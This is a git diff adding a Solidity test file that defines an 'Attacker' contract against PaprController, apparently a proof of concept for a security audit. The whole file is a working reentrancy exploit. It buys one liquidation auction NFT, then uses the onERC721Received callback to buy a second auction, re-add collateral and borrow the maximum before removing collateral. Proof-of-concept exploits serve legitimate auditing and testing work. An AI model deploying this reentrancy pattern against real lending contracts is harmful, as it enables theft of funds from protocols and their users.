index 0000000..cc5f451
--- /dev/null
+++ b/test/paprController/Attacker.sol
@@ -0,0 +1,89 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+import {ERC20} from "solmate/tokens/ERC20.sol";
+import {ERC721, ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";
+import {Owned} from "solmate/auth/Owned.sol";
+import {PaprController} from "../../src/PaprController.sol";
+import {IPaprController} from "../../src/interfaces/IPaprController.sol";
+import {INFTEDA} from "../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol";
+import {ReservoirOracleUnderwriter} from "../../src/ReservoirOracleUnderwriter.sol";
+
+contract Attacker is Owned {
+    PaprController public immutable controller;
+    ERC721 public immutable nft;
+    // cache for reenter
+    bool public reenter;
+    INFTEDA.Auction public auction2;
+    ReservoirOracleUnderwriter.OracleInfo public lowerOracle;
+    ReservoirOracleUnderwriter.OracleInfo public twapOracle;
+
+    constructor(PaprController _controller, ERC721 _nft) Owned(msg.sender) {
+        controller = _controller;
+        nft = _nft;
+        nft.setApprovalForAll(address(_controller), true);
+        controller.papr().approve(address(_controller), type(uint256).max);
+    }
+
+    function addAndLoanMax(uint256[] memory tokenIds, ReservoirOracleUnderwriter.OracleInfo memory _oracleInfo) external onlyOwner {
+        _addAndLoanMax(tokenIds, _oracleInfo);
+    }
+
+    function _addAndLoanMax(uint256[] memory tokenIds, ReservoirOracleUnderwriter.OracleInfo memory _oracleInfo) internal {
+        uint256 count = tokenIds.length;
+        IPaprController.Collateral[] memory collaterals = new IPaprController.Collateral[](count);
+        for (uint i = 0; i < count; i++) {
+            collaterals[i] = IPaprController.Collateral({id: tokenIds[i], addr: nft});
+        }
+        controller.addCollateral(collaterals);
+        uint256 oraclePrice = controller.underwritePriceForCollateral(nft, ReservoirOracleUnderwriter.PriceKind.LOWER, _oracleInfo);
+        uint256 loanAmount = controller.maxDebt(count * oraclePrice);
+        controller.increaseDebt(address(this), nft, loanAmount, _oracleInfo);
+    }
+
+    function attack(
+        INFTEDA.Auction calldata _auction1, INFTEDA.Auction memory _auction2,
+        ReservoirOracleUnderwriter.OracleInfo memory _lowerOracle, 
+        ReservoirOracleUnderwriter.OracleInfo memory _twapOracle
+    ) external onlyOwner {
+        reenter = true;
+        auction2 = _auction2;
+        lowerOracle = _lowerOracle;
+        twapOracle = _twapOracle;
+
+        //!! purchage auction1
+        controller.purchaseLiquidationAuctionNFT(_auction1, _auction1.startPrice, address(this), _twapOracle);
+
+        // reduce debt
+        uint256 debt = controller.vaultInfo(address(this), nft).debt;
+        controller.reduceDebt(address(this), nft, debt);
+
+        // remove all collaterals 100-120
+        IPaprController.Collateral[] memory collaterals = new IPaprController.Collateral[](20);
+        for (uint i = 0; i < 20; i++) {
+            collaterals[i] = IPaprController.Collateral({id: 100+i, addr: nft});
+        }
+        controller.removeCollateral(address(this), collaterals, _lowerOracle);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4)
+    {
+        require(msg.sender == address(nft));
+        if (!reenter) {
+            return ERC721TokenReceiver.onERC721Received.selector;
+        }
+        reenter = false;
+
+        // purchage auction2
+        controller.purchaseLiquidationAuctionNFT(auction2, auction2.startPrice, address(this), twapOracle);
+
+        // debt should be burnt now
+        // add collaterals 100-120 and loan max
+        uint256[] memory tokenIds = new uint256[](20);
+        for (uint i = 0; i < 20; i++) {
+            tokenIds[i] = i+100;
+        }
+        _addAndLoanMax(tokenIds, lowerOracle);
+        return ERC721TokenReceiver.onERC721Received.selector;
+    }
+}
